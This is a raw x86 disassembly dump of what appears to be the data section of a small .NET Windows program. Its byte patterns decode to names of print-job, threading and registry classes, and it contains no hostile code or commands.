  402dc2:	ins    BYTE PTR es:[edi],dx
  402dc3:	popa   
  402dc4:	je     0x402e2f
  402dc6:	outs   dx,DWORD PTR ds:[esi]
  402dc7:	outs   dx,BYTE PTR ds:[esi]
  402dc8:	push   edx
  402dc9:	gs ins BYTE PTR es:[edi],dx
  402dcb:	popa   
  402dcc:	js     0x402e2f
  402dce:	je     0x402e39
  402dd0:	outs   dx,DWORD PTR ds:[esi]
  402dd1:	outs   dx,BYTE PTR ds:[esi]
  402dd2:	jae    0x402e15
  402dd4:	je     0x402e4a
  402dd6:	jb     0x402e41
  402dd8:	bound  esi,QWORD PTR [ebp+0x74]
  402ddb:	add    BYTE PTR gs:[edx+0x75],dl
  402ddf:	outs   dx,BYTE PTR ds:[esi]
  402de0:	je     0x402e4b
  402de2:	ins    DWORD PTR es:[edi],dx
  402de3:	gs inc ebx
  402de5:	outs   dx,DWORD PTR ds:[esi]
  402de6:	ins    DWORD PTR es:[edi],dx
  402de7:	jo     0x402e4a
  402de9:	je     0x402e54
  402deb:	bound  ebp,QWORD PTR [ecx+0x6c]
  402dee:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  402df6:	bound  esi,QWORD PTR [ebp+0x74]
  402df9:	add    BYTE PTR gs:[ebx+esi*2+0x57],dl
  402dfe:	jo     0x402e66
  402e00:	push   edi
  402e01:	jb     0x402e73
  402e03:	add    BYTE PTR [ebx+0x54],dl
  402e06:	inc    ecx
  402e07:	push   esp
  402e08:	push   0x64616572
  402e0d:	inc    ecx
  402e0e:	je     0x402e84
  402e10:	jb     0x402e7b
  402e12:	bound  esi,QWORD PTR [ebp+0x74]
  402e15:	add    BYTE PTR gs:[ecx+0x72],ah
  402e19:	addr16 jae 0x402e1c
  402e1c:	push   ebx
  402e1d:	je     0x402e91
  402e1f:	imul   ebp,DWORD PTR [esi+0x67],0x5f706f00
  402e26:	inc    ebp
  402e27:	jno    0x402e9e
  402e29:	popa   
  402e2a:	ins    BYTE PTR es:[edi],dx
  402e2b:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x736e6f43
  402e33:	outs   dx,DWORD PTR ds:[esi]
  402e34:	ins    BYTE PTR es:[edi],dx
  402e35:	add    BYTE PTR gs:[edi+0x72],dl
  402e39:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  402e41:	inc    ebx
  402e42:	outs   dx,DWORD PTR ds:[esi]
  402e43:	outs   dx,BYTE PTR ds:[esi]
  402e44:	arpl   WORD PTR [ecx+0x74],sp
  402e47:	add    BYTE PTR [ebx+0x79],dl
  402e4a:	jae    0x402ec0
  402e4c:	gs ins DWORD PTR es:[edi],dx
  402e4e:	cs dec ecx
  402e50:	dec    edi
  402e51:	add    BYTE PTR [esi+0x69],al
  402e54:	ins    BYTE PTR es:[edi],dx
  402e55:	add    BYTE PTR gs:[ebp+eiz*2+0x6c],al
  402e5a:	gs je  0x402ec2
  402e5d:	add    BYTE PTR [ebp+0x78],al
  402e60:	arpl   WORD PTR [ebp+0x70],sp
  402e63:	je     0x402ece
  402e65:	outs   dx,DWORD PTR ds:[esi]
  402e66:	outs   dx,BYTE PTR ds:[esi]
  402e67:	add    BYTE PTR [ebp+0x79],ch
  402e6a:	push   eax
  402e6b:	jb     0x402ed6
  402e6d:	outs   dx,BYTE PTR ds:[esi]
  402e6e:	je     0x402ed5
  402e70:	jb     0x402e72
  402e72:	imul   ebp,DWORD PTR [esi+0x74],0x63617265
  402e79:	je     0x402ee4
  402e7b:	jbe    0x402ee2
  402e7d:	dec    ebp
  402e7e:	outs   dx,DWORD PTR ds:[esi]
  402e7f:	fs add BYTE PTR gs:[ecx+eiz*2+0x74],al
  402e85:	gs push esp
  402e87:	imul   ebp,DWORD PTR [ebp+0x65],0x6e694d00
  402e8e:	push   esi
  402e8f:	popa   
  402e90:	ins    BYTE PTR es:[edi],dx
  402e91:	jne    0x402ef8
  402e93:	add    BYTE PTR [eax+0x72],dl
  402e96:	imul   ebp,DWORD PTR [esi+0x74],0x49626f4a
  402e9d:	outs   dx,BYTE PTR ds:[esi]
  402e9e:	outs   dx,WORD PTR ds:[esi]
  402ea0:	inc    ebx
  402ea1:	outs   dx,DWORD PTR ds:[esi]
  402ea2:	ins    BYTE PTR es:[edi],dx
  402ea3:	ins    BYTE PTR es:[edi],dx
  402ea4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402ea9:	outs   dx,BYTE PTR ds:[esi]
  402eaa:	add    BYTE PTR [edi+0x65],al
  402ead:	je     0x402eff
  402eaf:	jb     0x402f1a
  402eb1:	outs   dx,BYTE PTR ds:[esi]
  402eb2:	je     0x402efe
  402eb4:	outs   dx,DWORD PTR ds:[esi]
  402eb5:	bound  ecx,QWORD PTR [ecx+0x6e]
  402eb8:	outs   dx,WORD PTR ds:[esi]
  402eba:	inc    ebx
  402ebb:	outs   dx,DWORD PTR ds:[esi]
  402ebc:	ins    BYTE PTR es:[edi],dx
  402ebd:	ins    BYTE PTR es:[edi],dx
  402ebe:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402ec3:	outs   dx,BYTE PTR ds:[esi]
  402ec4:	add    BYTE PTR [ebx+0x79],dl
  402ec7:	jae    0x402f3d
  402ec9:	gs ins DWORD PTR es:[edi],dx
  402ecb:	cs inc ebx
  402ecd:	outs   dx,DWORD PTR ds:[esi]
  402ece:	ins    BYTE PTR es:[edi],dx
  402ecf:	ins    BYTE PTR es:[edi],dx
  402ed0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402ed5:	outs   dx,BYTE PTR ds:[esi]
  402ed6:	jae    0x402f06
  402ed8:	inc    edi
  402ed9:	outs   dx,BYTE PTR gs:[esi]
  402edb:	gs jb  0x402f47
  402ede:	arpl   WORD PTR [eax],ax
  402ee0:	dec    ecx
  402ee1:	inc    ebp
  402ee2:	outs   dx,BYTE PTR ds:[esi]
  402ee3:	jne    0x402f52
  402ee5:	gs jb  0x402f49
  402ee8:	je     0x402f59
  402eea:	jb     0x402f4c
  402eec:	xor    DWORD PTR [eax],eax
  402eee:	push   eax
  402eef:	jb     0x402f5a
  402ef1:	outs   dx,BYTE PTR ds:[esi]
  402ef2:	je     0x402f47
  402ef4:	jns    0x402f69
  402ef6:	je     0x402f5d
  402ef8:	ins    DWORD PTR es:[edi],dx
  402ef9:	dec    edx
  402efa:	outs   dx,DWORD PTR ds:[esi]
  402efb:	bound  ecx,QWORD PTR [ecx+0x6e]
  402efe:	outs   dx,WORD PTR ds:[esi]
  402f00:	add    BYTE PTR [edi+0x65],al
  402f03:	je     0x402f4a
  402f05:	outs   dx,BYTE PTR ds:[esi]
  402f06:	jne    0x402f75
  402f08:	gs jb  0x402f6c
  402f0b:	je     0x402f7c
  402f0d:	jb     0x402f0f
  402f0f:	addr16 gs je 0x402f72
  402f13:	inc    ebx
  402f14:	jne    0x402f88
  402f16:	jb     0x402f7d
  402f18:	outs   dx,BYTE PTR ds:[esi]
  402f19:	je     0x402f1b
  402f1b:	addr16 gs je 0x402f7e
  402f1f:	push   esp
  402f20:	imul   ebp,DWORD PTR [ebp+0x65],0x53626f4a
  402f27:	jne    0x402f8b
  402f29:	ins    DWORD PTR es:[edi],dx
  402f2a:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x706f0064
  402f32:	pop    edi
  402f33:	dec    esp
  402f34:	gs jae 0x402faa
  402f37:	push   esp
  402f38:	push   0x53006e61
  402f3d:	jns    0x402fb2
  402f3f:	je     0x402fa6
  402f41:	ins    DWORD PTR es:[edi],dx
  402f42:	cs inc ebx
  402f44:	outs   dx,DWORD PTR ds:[esi]
  402f45:	ins    BYTE PTR es:[edi],dx
  402f46:	ins    BYTE PTR es:[edi],dx
  402f47:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402f4c:	outs   dx,BYTE PTR ds:[esi]
  402f4d:	jae    0x402f4f
  402f4f:	dec    ecx
  402f50:	inc    ebp
  402f51:	outs   dx,BYTE PTR ds:[esi]
  402f52:	jne    0x402fc1
  402f54:	gs jb  0x402fb8
  402f57:	je     0x402fc8
  402f59:	jb     0x402f5b
  402f5b:	dec    ebp
  402f5c:	outs   dx,DWORD PTR ds:[esi]
  402f5d:	jbe    0x402fc4
  402f5f:	dec    esi
  402f60:	gs js  0x402fd7
  402f63:	add    BYTE PTR [ecx+0x44],cl
  402f66:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  402f6d:	ins    BYTE PTR es:[edi],dx
  402f6e:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  402f73:	jo     0x402fe4
  402f75:	jae    0x402fdc
  402f77:	add    BYTE PTR [eax+0x72],dl
  402f7a:	imul   ebp,DWORD PTR [esi+0x74],0x74737953
  402f81:	gs ins DWORD PTR es:[edi],dx
  402f83:	dec    edi
  402f84:	bound  ebp,QWORD PTR [edx+0x65]
  402f87:	arpl   WORD PTR [eax+eax*1+0x67],si
  402f8b:	gs je  0x402fed
  402f8e:	dec    esi
  402f8f:	popa   
  402f90:	ins    DWORD PTR es:[edi],dx
  402f91:	add    BYTE PTR gs:[ecx+0x6e],cl
  402f95:	je     0x402fca
  402f97:	xor    al,BYTE PTR [eax]
  402f99:	dec    ebp
  402f9a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402fa1:	je     0x402fd1
  402fa3:	push   edi
  402fa4:	imul   ebp,DWORD PTR [esi+0x33],0x65520032
  402fab:	imul   esi,DWORD PTR [bp+di+0x74],0x47007972
  402fb3:	gs je  0x40300c
  402fb6:	popa   
  402fb7:	ins    BYTE PTR es:[edi],dx
  402fb8:	jne    0x40301f
  402fba:	add    BYTE PTR [ecx+ebp*2+0x6d],dl
  402fbe:	gs push ebx
  402fc0:	jo     0x403023
  402fc2:	outs   dx,BYTE PTR ds:[esi]
  402fc3:	add    BYTE PTR [esi+0x72],al
  402fc6:	outs   dx,DWORD PTR ds:[esi]
  402fc7:	ins    DWORD PTR es:[edi],dx
  402fc8:	dec    ebp
  402fc9:	imul   ebp,DWORD PTR [esi+0x75],0x736574
  402fd0:	push   esp
  402fd1:	outs   dx,DWORD PTR ds:[esi]
  402fd2:	push   ebx
  402fd3:	je     0x403047
  402fd5:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  402fdc:	pop    edi
  402fdd:	dec    esi
  402fde:	outs   dx,DWORD PTR ds:[esi]
  402fdf:	ja     0x402fe1
  402fe1:	push   ebx
  402fe2:	jns    0x403057
  402fe4:	je     0x40304b
  402fe6:	ins    DWORD PTR es:[edi],dx
  402fe7:	cs push esp
  402fe9:	push   0x64616572
  402fee:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  402ff5:	gs popa 
  402ff7:	add    BYTE PTR fs:[ebx+0x6c],dl
  402ffb:	gs gs jo 0x402fff
  402fff:	push   edx
  403000:	gs data16 jb 0x403069
  403004:	jae    0x40306e
  403006:	add    BYTE PTR [edi+0x65],ah
  403009:	je     0x40306a
  40300b:	dec    ecx
  40300c:	jae    0x40305e
  40300e:	jb     0x403079
  403010:	outs   dx,BYTE PTR ds:[esi]
  403011:	je     0x403078
  403013:	add    BYTE PTR fs:[edi+0x65],ah
  403017:	je     0x403078
  403019:	dec    ecx
  40301a:	jae    0x403060
  40301c:	gs ins BYTE PTR es:[edi],dx
  40301e:	gs je  0x403086
  403021:	add    BYTE PTR fs:[edi+0x70],ch
  403025:	pop    edi
  403026:	push   ebx
  403027:	jne    0x40308b
  403029:	je     0x40309d
  40302b:	popa   
  40302c:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  403030:	outs   dx,BYTE PTR ds:[esi]
  403031:	add    BYTE PTR [ebx+0x79],dl
  403034:	jae    0x4030aa
  403036:	gs ins DWORD PTR es:[edi],dx
  403038:	cs push ebx
  40303a:	arpl   WORD PTR gs:[ebp+0x72],si
  40303e:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x75636553
  403046:	jb     0x4030b1
  403048:	je     0x4030c3
  40304a:	inc    ebp
  40304b:	js     0x4030b0
  40304d:	gs jo  0x4030c4
  403050:	imul   ebp,DWORD PTR [edi+0x6e],0x69727000
  403057:	outs   dx,BYTE PTR ds:[esi]
  403058:	je     0x4030ab
  40305a:	jne    0x4030c1
  40305c:	jne    0x4030c3
  40305e:	dec    esi
  40305f:	popa   
  403060:	ins    DWORD PTR es:[edi],dx
  403061:	add    BYTE PTR gs:[eax+0x70],bh
  403065:	jae    0x4030ad
  403067:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  40306f:	push   ebx
  403070:	jns    0x4030e5
  403072:	je     0x4030d9
  403074:	ins    DWORD PTR es:[edi],dx
  403075:	cs push edi
  403077:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40307e:	pop    eax
  40307f:	jo     0x4030f4
  403081:	add    BYTE PTR [eax+0x70],bl
  403084:	jae    0x4030ca
  403086:	outs   dx,DWORD PTR ds:[esi]
  403087:	arpl   WORD PTR [ebp+0x6d],si
  40308a:	outs   dx,BYTE PTR gs:[esi]
  40308c:	je     0x4030e5
  40308e:	jb     0x4030f9
  403090:	je     0x4030f7
  403092:	jb     0x403094
  403094:	inc    ebx
  403095:	jb     0x4030fc
  403097:	popa   
  403098:	je     0x4030ff
  40309a:	pop    eax
  40309b:	jo     0x403110
  40309d:	inc    esp
  40309e:	outs   dx,DWORD PTR ds:[esi]
  40309f:	arpl   WORD PTR [ebp+0x6d],si
  4030a2:	outs   dx,BYTE PTR gs:[esi]
  4030a4:	je     0x4030fd
  4030a6:	jb     0x403111
  4030a8:	je     0x40310f
  4030aa:	jb     0x4030ac
  4030ac:	pop    eax
  4030ad:	jo     0x403122
  4030af:	inc    esp
  4030b0:	outs   dx,DWORD PTR ds:[esi]
  4030b1:	arpl   WORD PTR [ebp+0x6d],si
  4030b4:	outs   dx,BYTE PTR gs:[esi]
  4030b6:	je     0x403106
  4030b8:	outs   dx,DWORD PTR ds:[esi]
  4030b9:	je     0x403124
  4030bb:	imul   sp,WORD PTR [ebx+0x61],0x6974
  4030c1:	outs   dx,DWORD PTR ds:[esi]
  4030c2:	outs   dx,BYTE PTR ds:[esi]
  4030c3:	dec    esp
  4030c4:	gs jbe 0x40312c
  4030c7:	ins    BYTE PTR es:[edi],dx
  4030c8:	add    BYTE PTR [edi+0x72],dl
  4030cb:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x6e697250
  4030d3:	je     0x40313a
  4030d5:	jb     0x40311d
  4030d7:	jne    0x403145
  4030d9:	ins    BYTE PTR es:[edi],dx
  4030da:	dec    esi
  4030db:	popa   
  4030dc:	ins    DWORD PTR es:[edi],dx
  4030dd:	add    BYTE PTR gs:[ebx+0x74],dl
  4030e1:	jb     0x40314c
  4030e3:	outs   dx,BYTE PTR ds:[esi]
  4030e4:	addr16 inc ebx
  4030e6:	outs   dx,DWORD PTR ds:[esi]
  4030e7:	ins    DWORD PTR es:[edi],dx
  4030e8:	jo     0x40314b
  4030ea:	jb     0x403155
  4030ec:	jae    0x40315d
  4030ee:	outs   dx,BYTE PTR ds:[esi]
  4030ef:	add    BYTE PTR [ebx+0x74],dl
  4030f2:	popa   
  4030f3:	jb     0x403169
  4030f5:	jae    0x40314e
  4030f7:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x7473614c
  4030ff:	dec    ecx
  403100:	outs   dx,BYTE PTR ds:[esi]
  403101:	fs gs js 0x403154
  403105:	data16 add BYTE PTR [ebx+0x75],dl
  403109:	bound  esi,QWORD PTR [ebx+0x74]
  40310c:	jb     0x403177
  40310e:	outs   dx,BYTE PTR ds:[esi]
  40310f:	add    BYTE PTR [bx+si+0x72],dl
  403113:	imul   ebp,DWORD PTR [esi+0x74],0x76726553
  40311a:	gs jb  0x40311d
  40311d:	dec    esp
  40311e:	outs   dx,DWORD PTR ds:[esi]
  40311f:	arpl   WORD PTR [ecx+0x6c],sp
  403122:	push   eax
  403123:	jb     0x40318e
  403125:	outs   dx,BYTE PTR ds:[esi]
  403126:	je     0x40317b
  403128:	gs jb  0x4031a1
  40312b:	gs jb  0x40312e
  40312e:	push   ebp
  40312f:	outs   dx,BYTE PTR ds:[esi]
  403130:	jbe    0x403197
  403132:	jb     0x40319d
  403134:	imul   sp,WORD PTR [ecx+0x62],0x656c
  40313a:	inc    ebx
  40313b:	outs   dx,DWORD PTR ds:[esi]
  40313c:	fs gs inc ecx
  40313f:	je     0x4031b5
  403141:	jb     0x4031ac
  403143:	bound  esi,QWORD PTR [ebp+0x74]
  403146:	add    BYTE PTR gs:[eax],al
  403149:	adc    DWORD PTR [edi],ebp
  40314b:	add    BYTE PTR [esi+0x0],ch
  40314e:	outs   dx,DWORD PTR ds:[esi]
  40314f:	add    BYTE PTR [eax+eax*1+0x65],ah
  403153:	add    BYTE PTR [edx+0x0],ah
  403156:	jne    0x403158
  403158:	add    BYTE PTR [bx+si],al
  40315b:	ins    DWORD PTR es:[edi],dx
  40315c:	push   ebp
  40315d:	add    BYTE PTR [ebx+0x0],dh
  403160:	popa   
  403161:	add    BYTE PTR [edi+0x0],ah
  403164:	add    BYTE PTR gs:[edx],bh
  403167:	add    BYTE PTR [eax],ah
  403169:	add    BYTE PTR [eax+eax*1+0x73],dl
  40316d:	add    BYTE PTR [edi+0x0],dl
  403170:	jo     0x403172
  403172:	data16 add BYTE PTR [edi+0x0],dl
  403176:	jb     0x403178
  403178:	jo     0x40317a
  40317a:	add    BYTE PTR cs:[ebp+0x0],ah
  40317e:	js     0x403180
  403180:	add    BYTE PTR gs:[eax],ah
  403183:	add    BYTE PTR [eax+eax*1],bh
  403186:	push   eax
  403187:	add    BYTE PTR [edx+0x0],dh
  40318a:	imul   eax,DWORD PTR [eax],0x74006e
  403190:	add    BYTE PTR gs:[edx+0x0],dh
  403194:	dec    esi
  403195:	add    BYTE PTR [ecx+0x0],ah
  403198:	ins    DWORD PTR es:[edi],dx
  403199:	add    BYTE PTR [ebp+0x0],ah
  40319c:	add    BYTE PTR ds:[eax],ah
  40319f:	add    BYTE PTR [eax+eax*1],bh
  4031a2:	pop    eax
  4031a3:	add    BYTE PTR [eax+0x0],dl
  4031a6:	push   ebx
  4031a7:	add    BYTE PTR [esi+0x0],al
  4031aa:	imul   eax,DWORD PTR [eax],0x65006c
  4031b0:	add    BYTE PTR ds:[eax],ah
  4031b3:	add    BYTE PTR [ebx+0x0],bl
  4031b6:	das    
  4031b7:	add    BYTE PTR [esi+0x0],ch
  4031ba:	outs   dx,DWORD PTR ds:[esi]
  4031bb:	add    BYTE PTR [eax+eax*1+0x65],ah
  4031bf:	add    BYTE PTR [edx+0x0],ah
  4031c2:	jne    0x4031c4
  4031c4:	add    BYTE PTR [di+0x0],bl
  4031c8:	add    BYTE PTR [edi],bl
  4031ca:	push   eax
  4031cb:	add    BYTE PTR [edx+0x0],dh
  4031ce:	imul   eax,DWORD PTR [eax],0x74006e
  4031d4:	add    BYTE PTR gs:[edx+0x0],dh
  4031d8:	and    BYTE PTR [eax],al
  4031da:	and    BYTE PTR [eax],al
  4031dc:	and    BYTE PTR [eax],al
  4031de:	and    BYTE PTR [eax],al
  4031e0:	and    BYTE PTR [eax],al
  4031e2:	and    BYTE PTR [eax],al
  4031e4:	and    BYTE PTR [eax],al
  4031e6:	cmp    al,BYTE PTR [eax]
  4031e8:	add    BYTE PTR [edi],bl
  4031ea:	inc    esi
  4031eb:	add    BYTE PTR [ecx+0x0],ch
  4031ee:	ins    BYTE PTR es:[edi],dx
  4031ef:	add    BYTE PTR [ebp+0x0],ah
  4031f2:	and    BYTE PTR [eax],al
  4031f4:	and    BYTE PTR [eax],al
  4031f6:	and    BYTE PTR [eax],al
  4031f8:	and    BYTE PTR [eax],al
  4031fa:	and    BYTE PTR [eax],al
  4031fc:	and    BYTE PTR [eax],al
  4031fe:	and    BYTE PTR [eax],al
  403200:	and    BYTE PTR [eax],al
  403202:	and    BYTE PTR [eax],al
  403204:	and    BYTE PTR [eax],al
  403206:	cmp    al,BYTE PTR [eax]
  403208:	add    BYTE PTR [edi],bl
  40320a:	inc    ebp
  40320b:	add    BYTE PTR [edx+0x0],dh
  40320e:	jb     0x403210
  403210:	outs   dx,DWORD PTR ds:[esi]
  403211:	add    BYTE PTR [edx+0x0],dh
  403214:	and    BYTE PTR [eax],al
  403216:	jo     0x403218
  403218:	jb     0x40321a
  40321a:	imul   eax,DWORD PTR [eax],0x74006e
  403220:	imul   eax,DWORD PTR [eax],0x67006e
  403226:	cmp    al,BYTE PTR [eax]
  403228:	add    BYTE PTR [ebx],ah
  40322a:	inc    ebp
  40322b:	add    BYTE PTR [edx+0x0],dh
  40322e:	jb     0x403230
  403230:	outs   dx,DWORD PTR ds:[esi]
  403231:	add    BYTE PTR [edx+0x0],dh
  403234:	and    BYTE PTR [eax],al
  403236:	add    BYTE PTR fs:[ebp+0x0],ah
  40323a:	ins    BYTE PTR es:[edi],dx
  40323b:	add    BYTE PTR [ebp+0x0],ah
  40323e:	je     0x403240
  403240:	imul   eax,DWORD PTR [eax],0x67006e
  403246:	and    BYTE PTR [eax],al
  403248:	sub    BYTE PTR [eax],al
  40324a:	and    BYTE PTR [eax],al
  40324c:	add    BYTE PTR [edi],al
  40324e:	and    BYTE PTR [eax],al
  403250:	sub    DWORD PTR [eax],eax
  403252:	cmp    al,BYTE PTR [eax]
  403254:	add    BYTE PTR [ebx+0x45],al
  403257:	add    BYTE PTR [edx+0x0],dh
  40325a:	jb     0x40325c
  40325c:	outs   dx,DWORD PTR ds:[esi]
  40325d:	add    BYTE PTR [edx+0x0],dh
  403260:	and    BYTE PTR [eax],al
  403262:	ja     0x403264
  403264:	popa   
  403265:	add    BYTE PTR [ecx+0x0],ch
  403268:	je     0x40326a
  40326a:	imul   eax,DWORD PTR [eax],0x67006e
  403270:	and    BYTE PTR [eax],al
  403272:	data16 add BYTE PTR [edi+0x0],ch
  403276:	jb     0x403278
  403278:	and    BYTE PTR [eax],al
  40327a:	push   0x0
  40327c:	outs   dx,DWORD PTR ds:[esi]
  40327d:	add    BYTE PTR [edx+0x0],ah
  403280:	je     0x403282
  403282:	outs   dx,DWORD PTR ds:[esi]
  403283:	add    BYTE PTR [eax],ah
  403285:	add    BYTE PTR [ebx+0x0],ah
  403288:	outs   dx,DWORD PTR ds:[esi]
  403289:	add    BYTE PTR [ebp+0x0],ch
  40328c:	jo     0x40328e
  40328e:	ins    BYTE PTR es:[edi],dx
  40328f:	add    BYTE PTR [ebp+0x0],ah
  403292:	je     0x403294
  403294:	add    BYTE PTR gs:[edx],bh
  403297:	add    BYTE PTR [eax],al
  403299:	dec    ebx
  40329a:	push   edi
  40329b:	add    BYTE PTR [ecx+0x0],ah
  40329e:	imul   eax,DWORD PTR [eax],0x690074
  4032a4:	outs   dx,BYTE PTR ds:[esi]
  4032a5:	add    BYTE PTR [edi+0x0],ah
  4032a8:	and    BYTE PTR [eax],al
  4032aa:	inc    esi
  4032ab:	add    BYTE PTR [edi+0x0],ch
  4032ae:	jb     0x4032b0
  4032b0:	and    BYTE PTR [eax],al
  4032b2:	dec    edx
  4032b3:	add    BYTE PTR [edi+0x0],ch
  4032b6:	bound  eax,QWORD PTR [eax]
  4032b8:	and    BYTE PTR [eax],al
  4032ba:	je     0x4032bc
  4032bc:	outs   dx,DWORD PTR ds:[esi]
  4032bd:	add    BYTE PTR [eax],ah
  4032bf:	add    BYTE PTR [edx+0x0],ah
  4032c2:	add    BYTE PTR gs:[eax],ah
  4032c5:	add    BYTE PTR [eax+0x0],dh
  4032c8:	jb     0x4032ca
  4032ca:	imul   eax,DWORD PTR [eax],0x74006e
  4032d0:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4032d5:	add    BYTE PTR [eax],ah
  4032d7:	add    BYTE PTR [eax],ah
  4032d9:	add    BYTE PTR [eax],ah
  4032db:	add    BYTE PTR [eax],ah
  4032dd:	add    BYTE PTR [eax],ah
  4032df:	add    BYTE PTR [eax],ah
  4032e1:	add    BYTE PTR [edx],bh
  4032e3:	add    BYTE PTR [eax],al
  4032e5:	ja     0x40332f
  4032e7:	add    BYTE PTR [ebx+0x0],cl
  4032ea:	inc    ebp
  4032eb:	add    BYTE PTR [ecx+0x0],bl
  4032ee:	pop    edi
  4032ef:	add    BYTE PTR [ebx+0x0],al
  4032f2:	push   ebp
  4032f3:	add    BYTE PTR [edx+0x0],dl
  4032f6:	push   edx
  4032f7:	add    BYTE PTR [ebp+0x0],al
  4032fa:	dec    esi
  4032fb:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4032ff:	add    BYTE PTR [ebp+0x0],dl
  403302:	push   ebx
  403303:	add    BYTE PTR [ebp+0x0],al
  403306:	push   edx
  403307:	add    BYTE PTR [eax+eax*1+0x53],bl
  40330b:	add    BYTE PTR [edi+0x0],ch
  40330e:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  403313:	add    BYTE PTR [ecx+0x0],ah
  403316:	jb     0x403318
  403318:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40331d:	add    BYTE PTR [ecx+0x0],ch
  403320:	arpl   WORD PTR [eax],ax
  403322:	jb     0x403324
  403324:	outs   dx,DWORD PTR ds:[esi]
  403325:	add    BYTE PTR [ebx+0x0],dh
  403328:	outs   dx,DWORD PTR ds:[esi]
  403329:	add    BYTE PTR [esi+0x0],ah
  40332c:	je     0x40332e
  40332e:	pop    esp
  40332f:	add    BYTE PTR [eax+eax*1+0x65],dl
  403333:	add    BYTE PTR [edx+0x0],dh
  403336:	ins    DWORD PTR es:[edi],dx
  403337:	add    BYTE PTR [ecx+0x0],ch
  40333a:	outs   dx,BYTE PTR ds:[esi]
  40333b:	add    BYTE PTR [ecx+0x0],ah
  40333e:	ins    BYTE PTR es:[edi],dx
  40333f:	add    BYTE PTR [eax],ah
  403341:	add    BYTE PTR [ebx+0x0],dl
  403344:	add    BYTE PTR gs:[edx+0x0],dh
  403348:	jbe    0x40334a
  40334a:	add    BYTE PTR gs:[edx+0x0],dh
  40334e:	and    BYTE PTR [eax],al
  403350:	inc    ebx
  403351:	add    BYTE PTR [eax+eax*1+0x69],ch
  403355:	add    BYTE PTR [ebp+0x0],ah
  403358:	outs   dx,BYTE PTR ds:[esi]
  403359:	add    BYTE PTR [eax+eax*1+0x0],dh
  40335d:	pop    ds
  40335e:	push   esp
  40335f:	add    BYTE PTR [ebx+0x0],dl
  403362:	push   edi
  403363:	add    BYTE PTR [eax+0x0],dh
  403366:	data16 add BYTE PTR [edi+0x0],dl
  40336a:	jb     0x40336c
  40336c:	jo     0x40336e
  40336e:	push   esp
  40336f:	add    BYTE PTR [ecx+0x0],ch
  403372:	ins    DWORD PTR es:[edi],dx
  403373:	add    BYTE PTR [ebp+0x0],ah
  403376:	dec    edi
  403377:	add    BYTE PTR [ebp+0x0],dh
  40337a:	je     0x40337c
  40337c:	add    BYTE PTR [ecx],ah
  40337e:	push   edi
  40337f:	add    BYTE PTR [ecx+0x0],ch
  403382:	ins    BYTE PTR es:[edi],dx
  403383:	add    BYTE PTR [eax+eax*1+0x20],ch
  403387:	add    BYTE PTR [edi+0x0],dl
  40338a:	popa   
  40338b:	add    BYTE PTR [ecx+0x0],ch
  40338e:	je     0x403390
  403390:	and    BYTE PTR [eax],al
  403392:	inc    esi
  403393:	add    BYTE PTR [edi+0x0],ch
  403396:	jb     0x403398
  403398:	and    BYTE PTR [eax],al
  40339a:	cmp    eax,0x2000
  40339f:	cmp    ecx,DWORD PTR [edx+0x0]
  4033a2:	outs   dx,DWORD PTR ds:[esi]
  4033a3:	add    BYTE PTR [edx+0x0],ah
  4033a6:	and    BYTE PTR [eax],al
  4033a8:	push   edi
  4033a9:	add    BYTE PTR [ecx+0x0],ah
  4033ac:	jae    0x4033ae
  4033ae:	and    BYTE PTR [eax],al
  4033b0:	push   eax
  4033b1:	add    BYTE PTR [edx+0x0],dh
  4033b4:	imul   eax,DWORD PTR [eax],0x74006e
  4033ba:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4033bf:	add    BYTE PTR [edi+0x0],ch
  4033c2:	jb     0x4033c4
  4033c4:	and    BYTE PTR [eax],al
  4033c6:	inc    ebx
  4033c7:	add    BYTE PTR [ecx+0x0],ah
  4033ca:	outs   dx,BYTE PTR ds:[esi]
  4033cb:	add    BYTE PTR [ebx+0x0],ah
  4033ce:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  4033d3:	add    BYTE PTR [ebp+0x0],ah
  4033d6:	add    BYTE PTR fs:[ecx],ah
  4033d9:	add    BYTE PTR [eax],al
  4033db:	aas    
  4033dc:	dec    edx
  4033dd:	add    BYTE PTR [edi+0x0],ch
  4033e0:	bound  eax,QWORD PTR [eax]
  4033e2:	and    BYTE PTR [eax],al
  4033e4:	push   edi
  4033e5:	add    BYTE PTR [ecx+0x0],ah
  4033e8:	jae    0x4033ea
  4033ea:	and    BYTE PTR [eax],al
  4033ec:	outs   dx,BYTE PTR ds:[esi]
  4033ed:	add    BYTE PTR [edi+0x0],ch
  4033f0:	je     0x4033f2
  4033f2:	and    BYTE PTR [eax],al
  4033f4:	jo     0x4033f6
  4033f6:	jb     0x4033f8
  4033f8:	imul   eax,DWORD PTR [eax],0x74006e
  4033fe:	add    BYTE PTR gs:[eax+eax*1+0x2c],ah
  403403:	add    BYTE PTR [eax],ah
  403405:	add    BYTE PTR [edi+0x0],ah
  403408:	imul   eax,DWORD PTR [eax],0x690076
  40340e:	outs   dx,BYTE PTR ds:[esi]
  40340f:	add    BYTE PTR [edi+0x0],ah
  403412:	and    BYTE PTR [eax],al
  403414:	jne    0x403416
  403416:	jo     0x403418
  403418:	and    DWORD PTR [eax],eax
  40341a:	add    BYTE PTR [ebx+0x4a],bl
